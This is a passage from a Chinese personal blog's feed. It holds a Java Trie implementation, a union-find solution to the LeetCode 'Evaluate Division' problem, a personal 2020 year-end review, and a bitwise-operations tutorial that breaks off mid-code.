class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Trie</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Inserts a word into the trie. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insert</span><span class="params">(String word)</span> </span>&#123;</span><br><span class="line">        Trie root = <span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">char</span>[] chars = word.toCharArray();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; chars.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(root.next[chars[i] - <span class="string">&#x27;a&#x27;</span>] == <span class="keyword">null</span>)&#123;</span><br><span class="line">                root.next[chars[i] - <span class="string">&#x27;a&#x27;</span>] = <span class="keyword">new</span> Trie();</span><br><span class="line">            &#125;</span><br><span class="line">            root = root.next[chars[i] - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        root.isEnd = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Returns if the word is in the trie. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">search</span><span class="params">(String word)</span> </span>&#123;</span><br><span class="line">        Trie root = <span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">char</span>[] chars = word.toCharArray();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; chars.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(root.next[chars[i] - <span class="string">&#x27;a&#x27;</span>] == <span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            root = root.next[chars[i] - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root.isEnd;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Returns if there is any word in the trie that starts with the given prefix. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">startsWith</span><span class="params">(String prefix)</span> </span>&#123;</span><br><span class="line">        Trie root = <span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">char</span>[] chars = prefix.toCharArray();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; chars.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(root.next[chars[i] - <span class="string">&#x27;a&#x27;</span>] == <span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            root = root.next[chars[i] - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="11-并查集"><a href="#11-并查集" class="headerlink" title="11. 并查集"></a>11. 并查集</h1><h2 id="11-1-除法求值"><a href="#11-1-除法求值" class="headerlink" title="11.1 除法求值"></a>11.1 除法求值</h2><p>这个题应该被列为hard，先copy</p><p>​        这道题是在「力扣」第 990 题（等式方程的可满足性）的基础上，在变量和变量之间有了倍数关系。由于变量之间的倍数关系具有传递性，处理有传递性关系的问题，可以使用「并查集」，我们需要在并查集的「合并」与「查询」操作中 维护这些变量之间的倍数关系。</p><p>​        说明：请注意题目中的「注意」和「数据范围」，例如：每个 Ai 或 Bi 是一个表示单个变量的字符串。所以用例 equation = [“ab”, “cd”] ，这里的 ab 视为一个变量，不表示 a * b。如果面试中遇到这样的问题，一定要和面试官确认清楚题目的条件。还有 1 &lt;= equations.length &lt;= 20 和 values[i] &gt; 0.0 可以避免一些特殊情况的讨论。</p><p><strong>方法：并查集</strong></p><p>分析示例 1：</p><p>a / b = 2.0 说明 a = 2b， a 和 b 在同一个集合中；</p><p>b / c = 3.0 说明 b = 3c ，b 和 c 在同一个集合中。</p><p>求 $\cfrac{a}{c}$   ，可以把 a = 2b，b=3c 依次代入，得到 $\cfrac{a}{c} = \cfrac{2b} {c} = \cfrac{2 \cdot 3c} {c} = 6.0$<br>求$\cfrac{b}{a}$，很显然根据 a = 2b，知道 $\cfrac{b}{a} = 0.5$ ，也可以把 b 和 a 都转换成为 c 的倍数，$\cfrac{b}{a} = \cfrac{b} {2b} = \cfrac{3c} {6c} = \cfrac{1}{2} = 0.5 $</p><p>​        我们计算了两个结果，不难知道：可以将题目给出的 equation 中的两个变量所在的集合进行「合并」，同在一个集合中的两个变量就可以通过某种方式计算出它们的比值。具体来说，可以把 不同的变量的比值转换成为相同的变量的比值，这样在做除法的时候就可以消去相同的变量，然后再计算转换成相同变量以后的系数的比值，就是题目要求的结果。统一了比较的标准，可以以 O(1)的时间复杂度完成计算。</p><p>​        如果两个变量不在同一个集合中， 返回 −1.0。并且根据题目的意思，如果两个变量中 至少有一个 变量没有出现在所有 equations 出现的字符集合中，也返回 -1.0。</p><p><strong>构建有向图</strong></p><p>​        通过例 1 的分析，我们就知道了，题目给出的 equations 和 values 可以表示成一个图，equations 中出现的变量就是图的顶点，「分子」于「分母」的比值可以表示成一个有向关系（因为「分子」和「分母」是有序的，不可以对换），并且这个图是一个带权图，values 就是对应的有向边的权值。例 1 中给出的 equations 和 values 表示的「图形表示」、「数学表示」和「代码表示」如下表所示。其中 parent[a] = b 表示：结点 a 的（直接）父亲结点是 b，与之对应的有向边的权重，记为 weight[a] = 2.0，即 weight[a] 表示结点 a 到它的 直接父亲结点 的有向边的权重。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/除法求值.png" alt="除法求值" style="zoom:50%;" /></p><p><strong>「统一变量」与「路径压缩」的关系</strong></p><p>​        刚刚在分析例 1 的过程中，提到了：可以把一个一个 query 中的不同变量转换成 同一个变量，这样在计算 query 的时候就可以以 O(1)的时间复杂度计算出结果，在「并查集」的一个优化技巧中，「路径压缩」就恰好符合了这样的应用场景。</p><p>​        为了避免并查集所表示的树形结构高度过高，影响查询性能。「路径压缩」就是针对树的高度的优化。「路径压缩」的效果是：在查询一个结点 a 的根结点同时，把结点 a 到根结点的沿途所有结点的父亲结点都指向根结点。如下图所示，除了根结点以外，所有的结点的父亲结点都指向了根结点。特别地，也可以认为根结点的父亲结点就是根结点自己。如下国所示：路径压缩前后，并查集所表示的两棵树形结构等价，路径压缩以后的树的高度为 2，查询性能最好。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/除法求值1.png" alt="除法求值1" style="zoom:50%;" /></p><p>​        由于有「路径压缩」的优化，两个同在一个连通分量中的不同的变量，它们分别到根结点（父亲结点）的权值的比值，就是题目的要求的结果。</p><p><strong>如何在「查询」操作的「路径压缩」优化中维护权值变化</strong></p><p>​    如下图所示，我们在结点 a 执行一次「查询」操作。路径压缩会先一层一层向上先找到根结点 d，然后依次把 c、b 、a 的父亲结点指向根结点 d。</p><ul><li>c 的父亲结点已经是根结点了，它的权值不用更改；</li><li>b 的父亲结点要修改成根结点，它的权值就是从当前结点到根结点经过的所有有向边的权值的乘积，因此是 3.0 乘以 4.0 也就是 12.0；</li><li>a 的父亲结点要修改成根结点，它的权值就是依然是从当前结点到根结点经过的所有有向边的权值的乘积，但是我们 没有必要把这三条有向边的权值乘起来，这是因为 b 到 c，c 到 d 这两条有向边的权值的乘积，我们在把 b 指向 d 的时候已经计算出来了。因此，a 到根结点的权值就等于 b 到根结点 d 的新的权值乘以 a 到 b 的原来的有向边的权值。</li></ul><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/除法求值2.png" alt="除法求值2" style="zoom: 33%;" /></p><p><strong>如何在「合并」操作中维护权值的变化</strong></p><p>「合并」操作基于这样一个 很重要的前提：我们将要合并的两棵树的高度最多为 2，换句话说两棵树都必需是「路径压缩」以后的效果，两棵树的叶子结点到根结点最多只需要经过一条有向边。</p><p>​    例如已知$ \cfrac{a}{b} = 3.0$ ，$\cfrac{d}{c} = 4.0$  ，又已知 $\cfrac{a}{d} = 6.0$  ，现在合并结点 a 和 d 所在的集合，其实就是把 a 的根结点 b 指向 d 的根结 c，那么如何计算 b 指向 c 的这条有向边的权重呢？</p><p>​    根据 a 经过 b 可以到达 c，a 经过 d 也可以到达 c，因此 两条路径上的有向边的权值的乘积是一定相等的。设 b 到 c 的权值为 x，那么 $3.0 \cdot x = 6.0 \cdot 4.0$ ，得 $x=8.0$。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/除法求值3.png" alt="除法求值3" style="zoom: 67%;" /></p><p><strong>一个容易忽略的细节</strong></p><p>​        接下来还有一个小的细节问题：在合并以后，产生了一棵高度为 3 的树，那么我们在执行查询的时候，例如下图展示的绿色结点和黄色结点，绿色结点并不直接指向根结点，在计算这两个变量的比值的时候，计算边的权值的比值得到的结果是不对的。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/除法求值4.png" alt="除法求值4" style="zoom:50%;" /></p><p>​        但其实不用担心这个问题，并查集的「查询」操作会执行「路径压缩」，所以真正在计算两个变量的权值的时候，绿色结点已经指向了根结点，和黄色结点的根结点相同。因此可以用它们指向根结点的有向边的权值的比值作为两个变量的比值。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/除法求值5.png" alt="除法求值5" style="zoom:50%;" /></p><p>​    我们通过这个细节向大家强调：一边查询一边修改结点指向是并查集的特色。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">double</span>[] calcEquation(List&lt;List&lt;String&gt;&gt; equations, <span class="keyword">double</span>[] values, List&lt;List&lt;String&gt;&gt; queries) &#123;</span><br><span class="line">        <span class="keyword">int</span> equationsSize = equations.size();</span><br><span class="line"></span><br><span class="line">        UnionFind unionFind = <span class="keyword">new</span> UnionFind(<span class="number">2</span> * equationsSize);</span><br><span class="line">        <span class="comment">// 第 1 步：预处理，将变量的值与 id 进行映射，使得并查集的底层使用数组实现，方便编码</span></span><br><span class="line">        Map&lt;String, Integer&gt; hashMap = <span class="keyword">new</span> HashMap&lt;&gt;(<span class="number">2</span> * equationsSize);</span><br><span class="line">        <span class="keyword">int</span> id = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; equationsSize; i++) &#123;</span><br><span class="line">            List&lt;String&gt; equation = equations.get(i);</span><br><span class="line">            String var1 = equation.get(<span class="number">0</span>);</span><br><span class="line">            String var2 = equation.get(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!hashMap.containsKey(var1)) &#123;</span><br><span class="line">                hashMap.put(var1, id);</span><br><span class="line">                id++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!hashMap.containsKey(var2)) &#123;</span><br><span class="line">                hashMap.put(var2, id);</span><br><span class="line">                id++;</span><br><span class="line">            &#125;</span><br><span class="line">            unionFind.union(hashMap.get(var1), hashMap.get(var2), values[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第 2 步：做查询</span></span><br><span class="line">        <span class="keyword">int</span> queriesSize = queries.size();</span><br><span class="line">        <span class="keyword">double</span>[] res = <span class="keyword">new</span> <span class="keyword">double</span>[queriesSize];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; queriesSize; i++) &#123;</span><br><span class="line">            String var1 = queries.get(i).get(<span class="number">0</span>);</span><br><span class="line">            String var2 = queries.get(i).get(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            Integer id1 = hashMap.get(var1);</span><br><span class="line">            Integer id2 = hashMap.get(var2);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (id1 == <span class="keyword">null</span> || id2 == <span class="keyword">null</span>) &#123;</span><br><span class="line">                res[i] = -<span class="number">1.0d</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                res[i] = unionFind.isConnected(id1, id2);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">UnionFind</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span>[] parent;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 指向的父结点的权值</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">double</span>[] weight;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">UnionFind</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.parent = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">            <span class="keyword">this</span>.weight = <span class="keyword">new</span> <span class="keyword">double</span>[n];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">                parent[i] = i;</span><br><span class="line">                weight[i] = <span class="number">1.0d</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">union</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">double</span> value)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">int</span> rootX = find(x);</span><br><span class="line">            <span class="keyword">int</span> rootY = find(y);</span><br><span class="line">            <span class="keyword">if</span> (rootX == rootY) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            parent[rootX] = rootY;</span><br><span class="line">          <span class="comment">// 关系式的推导请见「参考代码」下方的示意图</span></span><br><span class="line">            weight[rootX] = weight[y] * value / weight[x];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 路径压缩</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@param</span> x</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@return</span> 根结点的 id</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (x != parent[x]) &#123;</span><br><span class="line">                <span class="keyword">int</span> origin = parent[x];</span><br><span class="line">                parent[x] = find(parent[x]);</span><br><span class="line">                weight[x] *= weight[origin];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> parent[x];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">isConnected</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">int</span> rootX = find(x);</span><br><span class="line">            <span class="keyword">int</span> rootY = find(y);</span><br><span class="line">            <span class="keyword">if</span> (rootX == rootY) &#123;</span><br><span class="line">                <span class="keyword">return</span> weight[x] / weight[y];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1.0d</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说明：代码 weight[rootX] = weight[y] * value / weight[x]; 的推导过程，主要需要明白各个变量的含义，由两条路径有向边的权值乘积相等得到相等关系，然后做等价变换即可。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/除法求值6.png" alt="除法求值6" style="zoom:50%;" /></p><p><strong>复杂度分析</strong></p><ul><li>时间复杂度：$O((N + Q)\log A)$<ul><li>构建并查集 $O(N \log A)$ ，这里 N 为输入方程 equations 的长度，每一次执行合并操作的时间复杂度是 $O(\log A)$，这里 A 是 equations 里不同字符的个数；</li><li>查询并查集 $O(Q \log A)$，这里 Q 为查询数组 queries 的长度，每一次查询时执行「路径压缩」的时间复杂度是 $O(\log A)$。</li></ul></li><li>空间复杂度：O(A)：创建字符与 id 的对应关系 hashMap 长度为 A，并查集底层使用的两个数组 parent 和 weight 存储每个变量的连通分量信息，parent 和 weight 的长度均为 A。</li></ul>]]></content>
    
    
    <summary type="html">leetcodeTOP100</summary>
    
    
    
    <category term="算法" scheme="http://lishuaiyun.cn/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="算法" scheme="http://lishuaiyun.cn/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="TOP100" scheme="http://lishuaiyun.cn/tags/TOP100/"/>
    
  </entry>
  
  <entry>
    <title>2020年终总结</title>
    <link href="http://lishuaiyun.cn/2021/03/11/2020%E6%80%BB%E7%BB%93/"/>
    <id>http://lishuaiyun.cn/2021/03/11/2020%E6%80%BB%E7%BB%93/</id>
    <published>2021-03-11T11:53:14.000Z</published>
    <updated>2022-03-26T11:26:27.057Z</updated>
    
    <content type="html"><![CDATA[<p>2020年的生活比往年更有意义，发生了很多事。</p><h1 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h1><p>今年我的开发技术应该算是飞跃的一年，大把的空闲时间以及专业的改变让我更能专注于技术的提升。以前的开发能力约等于无，现在的我开发能力虽然可能还是比不过身边的同学，但是已经可以聊的有来有回了。</p><ul><li><p>完善了Java后端的技术栈。</p></li><li><p>leetcode从无到200+，基本是囫囵吞枣的填鸭式做题，不过还是对算法的应用有了点自己的理解，继续努力。</p></li><li>尝试找了实习，虽然最后没找到，但是确实给我指明了一些方向，不至于走了弯路（有一说一字节真的问的我自闭）。</li></ul><h1 id="生活"><a href="#生活" class="headerlink" title="生活"></a>生活</h1><p>进入了北邮以后，实验室的老师，学长和同学都很nice，每天晚上奋战到11点觉得很充实。我也开始有意识的开始读一些业余的书，不过买了很多看的很少hh，看完的书大概有：</p><ul><li>如何阅读一本书，不错的工具书，也契合了很多自己一直以来的学习方法。</li><li>非暴力沟通，沟通技巧总结的很好，但是我一直没有有意识的运用。</li><li>黑客与画家，nice！程序是帮助我们思考的画笔</li></ul><p>没看的书还有好多好多，希望2021的我可以勤奋一点。</p><p>进入北邮开始健身了，刚开始健身的时候别人说很难坚持，但是每天和实验室学长一起去健身以后发现这是很有意义并且并不是很难的事，虽然肌肉没有明显的改变，但是力量确实有所增强，实名感谢实验室诸多学长。</p><p>过年买了把吉他，最近一直在沉迷练习，但是还没能连贯的弹出完整的曲子，暂时按下不表。（啥时候能谈了直接发朋友圈，悄悄的惊艳所有人，不谈~~）</p><h1 id="新的一年"><a href="#新的一年" class="headerlink" title="新的一年"></a>新的一年</h1><p>我是个太贪心的人，总想在新的一年完成太多的目标，人毕竟还是要有梦想的。</p><ul><li>提升后端技术，想把github上的miaosha项目fork过来用springcloud做微服务改造。</li><li>暑假找到一个大厂实习</li><li>leetcode400+</li><li>坚持健身（顺带练练腹肌最好）</li><li>看书10本（把我买的一堆书消化消化，君主论，理想国，小狗钱钱，指数资金投资指南，乌合之众，自卑与超越，先列举这些趴）</li><li>多学几首吉他曲（想学的可太多了）</li><li>想看梁博，周杰伦的演唱会~~</li></ul><p>成为更好的自己！</p>]]></content>
    
    
    <summary type="html">迟到的2020总结</summary>
    
    
    
    <category term="生活" scheme="http://lishuaiyun.cn/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
    <category term="生活" scheme="http://lishuaiyun.cn/tags/%E7%94%9F%E6%B4%BB/"/>
    
    <category term="年度总结" scheme="http://lishuaiyun.cn/tags/%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>位运算</title>
    <link href="http://lishuaiyun.cn/2021/03/11/%E4%BD%8D%E8%BF%90%E7%AE%97/"/>
    <id>http://lishuaiyun.cn/2021/03/11/%E4%BD%8D%E8%BF%90%E7%AE%97/</id>
    <published>2021-03-11T11:53:14.000Z</published>
    <updated>2022-03-26T13:16:14.272Z</updated>
    
    <content type="html"><![CDATA[<p>位运算符</p><ul><li><p>&amp; 与运算 两个位都是 1 时，结果才为 1，否则为 0，如  </p><p>1 0 0 1 1  </p></li></ul><p>&amp;     1 1 0 0 1  </p><hr><p>​        1 0 0 0 1 </p><ul><li><p>| 或运算 两个位都是 0 时，结果才为 0，否则为 1，如  </p></li><li><p>1 0 0 1 1  </p><p>|   1 1 0 0 1  </p></li></ul><hr><p>​       1 1 0 1 1 </p><ul><li><p>^ 异或运算，两个位相同则为 0，不同则为 1，如  </p><p>1 0 0 1 1  </p><p> ^  1 1 0 0 1  </p></li></ul><hr><p>​         0 1 0 1 0 </p><ul><li><p>~ 取反运算，0 则变为 1，1 则变为 0，如 </p><p>~   1 0 0 1 1  </p><hr><p>0 1 1 0 0 </p></li><li><p>&lt;&lt; 左移运算，向左进行移位操作，高位丢弃，低位补 0，如</p></li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">int</span> <span class="string">a</span> <span class="string">=</span> <span class="number">8</span><span class="string">;</span></span><br><span class="line"><span class="string">a</span> <span class="string">&lt;&lt;</span> <span class="number">3</span><span class="string">;</span></span><br><span class="line"><span class="string">移位前：0000</span> <span class="number">0000 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">1000</span></span><br><span class="line"><span class="string">移位后：0000</span> <span class="number">0000 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0100 </span><span class="number">0000</span></span><br></pre></td></tr></table></figure><p>>&gt; 右移运算，向右进行移位操作，对无符号数，高位补 0，对于有符号数，高位补符号位，如</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">unsigned</span> <span class="string">int</span> <span class="string">a</span> <span class="string">=</span> <span class="number">8</span><span class="string">;</span></span><br><span class="line"><span class="string">a</span> <span class="string">&gt;&gt;</span> <span class="number">3</span><span class="string">;</span></span><br><span class="line"><span class="string">移位前：0000</span> <span class="number">0000 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">1000</span></span><br><span class="line"><span class="string">移位后：0000</span> <span class="number">0000 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0001</span></span><br><span class="line"></span><br><span class="line"><span class="string">int</span> <span class="string">a</span> <span class="string">=</span> <span class="number">-8</span><span class="string">;</span></span><br><span class="line"><span class="string">a</span> <span class="string">&gt;&gt;</span> <span class="number">3</span><span class="string">;</span></span><br><span class="line"><span class="string">移位前：1111</span> <span class="number">1111 </span><span class="number">1111 </span><span class="number">1111 </span><span class="number">1111 </span><span class="number">1111 </span><span class="number">1111 </span><span class="number">1000</span></span><br><span class="line"><span class="string">移位后：1111</span> <span class="number">1111 </span><span class="number">1111 </span><span class="number">1111 </span><span class="number">1111 </span><span class="number">1111 </span><span class="number">1111 </span><span class="number">1111</span></span><br></pre></td></tr></table></figure><p>常见位运算问题</p><p><strong>1. 位操作实现乘除法</strong></p><ul><li>数 a 向右移一位，相当于将 a 除以 2；数 a 向左移一位，相当于将 a 乘以 2</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">int</span> a = <span class="number">2</span>;</span><br><span class="line"><span class="attribute">a</span> &gt;&gt; <span class="number">1</span>; ---&gt; <span class="number">1</span></span><br><span class="line"><span class="attribute">a</span> &lt;&lt; <span class="number">1</span>; ---&gt; <span class="number">4</span></span><br></pre></td></tr></table></figure><p><strong>2. 位操作交货两数</strong></p><ul><li>位操作交换两数可以不需要第三个临时变量，虽然普通操作也可以做到，但是没有其效率高</li></ul><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//普通操作</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span> &amp;a, <span class="keyword">int</span> &amp;b)</span> </span>&#123;</span><br><span class="line">    a = a + b;</span><br><span class="line">    b = a - b;</span><br><span class="line">    a = a - b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//位与操作</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span> &amp;a, <span class="keyword">int</span> &amp;b)</span> </span>&#123;</span><br><span class="line">    a ^= b;</span><br><span class="line">    b ^= a;</span><br><span class="line">    a ^= b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>位与操作解释：第一步：a ^= b —-&gt; a = (a^b); </p><p>第二步：b ^= a —-&gt; b = b^(a^b) —-&gt; b = (b^b)^a = a</p><p>第三步：a ^= b —-&gt; a = (a^b)^a = (a^a)^b = b</p><p><strong>3. 位操作判断奇偶数</strong></p><ul><li>只要根据数的最后一位是 0 还是 1 来决定即可，为 0 就是偶数，为 1 就是奇数。</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span><span class="params">(<span class="number">0</span> == (a &amp; <span class="number">1</span>)</span></span>) &#123;</span><br><span class="line"><span class="comment">//偶数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>4. 位操作交换符号</strong></p><ul><li>交换符号将正数变成负数，负数变成正数</li></ul><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> 